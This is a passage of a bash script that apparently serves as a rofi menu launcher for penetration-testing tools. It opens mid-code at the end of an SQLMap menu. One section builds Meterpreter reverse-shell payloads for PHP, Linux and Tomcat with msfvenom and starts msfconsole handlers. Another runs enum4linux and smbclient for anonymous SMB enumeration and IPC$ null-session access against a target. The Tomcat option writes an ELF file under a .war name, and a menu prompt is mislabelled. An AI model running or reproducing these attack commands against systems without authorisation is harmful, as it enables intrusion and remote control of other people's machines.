				break
				##EXIT
			elif [[ $sqlmaps == "13" ]]; then
				exit
				fi
			done


##---------------------------------------------------##
##                 Reverse Shell                     ##
##---------------------------------------------------##


	elif [[ $syntax == "7" ]]; then
		while true; do
			reverseshell=$(echo -e "1. PHP Reverse Shell\n2. Linux Reverse Shell\n3. Tomcat Reverse Shell\n4. Back\n5. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Reverse Shell would you like to use?" | cut -d '.' -f 1)
			##PHP Reverse Shell
			if [[ $reverseshell == "1" ]]; then
				msfvenom -p php/meterpreter_reverse_tcp lhost=127.0.0.1 lport=443 -o shell.php
				sleep 3
				msfconsole -q -x "use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set payload php/meterpreter_reverse_tcp; run; exit -y"

				##Linux Reverse Shell
			elif [[ $reverseshell == "2" ]]; then
				port=$(nmap -sS -p- "$scan" | cut -d " " -f 1 | sed 's/[^0-9]*//g' | sed '/^$/d'| rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "What Port would you like to use?" | cut -d '.' -f 1)
				msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=127.0.0.1 lport="$port" -o shell  
				sleep 3
				msfconsole -q -x "use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT $port; set payload linux/x64/meterpreter_reverse_tcp; run; exit -y"

				##Tomcat Reverse Shell
			elif [[ $reverseshell == "3" ]]; then
				port=$(nmap -sS -p- "$scan" | cut -d " " -f 1 | sed 's/[^0-9]*//g' | sed '/^$/d' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Port would you like to use?" | cut -d '.' -f 1)
				msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=127.0.0.1 lport="$port" -f elf -o shell.war 
				sleep 3
				msfconsole -q -x "use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT $port; set payload linux/x64/meterpreter_reverse_tcp; run; exit -y"

				##Back
			elif [[ $reverseshell == "4" ]]; then
				break

				##Exit
			elif [[ $reverseshell == "5" ]]; then
				exit


			fi
		done


##---------------------------------------------------##
##                 Null Sessions                     ##
##---------------------------------------------------##

	elif [[ "$syntax" == "8" ]]; then
		while true; do
			nullsession=$(echo -e "1.  nblookup/netstat\n2.  Password Policy Info\n3.  Enumerate Shares List\n4.  Enumerate Users List\n5.  Do All Above at once\n6.  Brute Forces Users\n7.  Service Available\n8.  Force no Pass\n9.  Exploit Null Sessions\n10. No Pass or User\n11. Not sure yet\n12. Back\n13. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which SQLMap Command would you like to use?" | cut -d '.' -f 1)

				##NbLookup/Netstat
				if [[ $nullsession == "1" ]]; then
					enum4linux -n "$scan"

				##Password Policy
			elif [[ $nullsession == "2" ]]; then
				enum4linux -P "$scan"

				##Enumerate Shares Liss
			elif [[ $nullsession == "3" ]]; then
				enum4linux -S "$scan"

				##Enumerate Users List
			elif [[ $nullsession == "4" ]]; then
				enum4linux -U "$scan"

				##Do Everything Above at once
			elif [[ $nullsession == "5" ]]; then
				enum4linux -a "$scan"

				##Brute Force Users
			elif [[ $nullsession == "6" ]]; then
				enum4linux -s /usr/share/enum4linux/share-list.txt "$scan"

				##Service Available
			elif [[ $nullsession == "7" ]]; then
				smbclient -L //"$scan"

				##Force No Pass
			elif [[ $nullsession == "8" ]]; then
				smbclient -L //"$scan" -N

				##Exploit Null Session	
			elif [[ $nullsession == "9" ]]; then
				smbclient //"$scan"/IPC$ -N

				##No Pass/User
			elif [[ $nullsession == "10" ]]; then
				smbclient -L WORKGROUP -i "$scan" -N -U ' '

				#Not Sure
			elif [[ $nullsession == "11" ]]; then
				smbclient \\\\\\\\\\\\"$scan"\\\\\\WorkSharing -N

				##BACK	
			elif [[ $nullsession == "12" ]]; then
				break

				##EXIT
			elif [[ $nullsession == "13" ]]; then
				exit


				fi
			done


##---------------------------------------------------##
##                     Exit                          ##
##---------------------------------------------------##

	elif [[ "$syntax" == "9" ]]; then
		exit

	fi
done

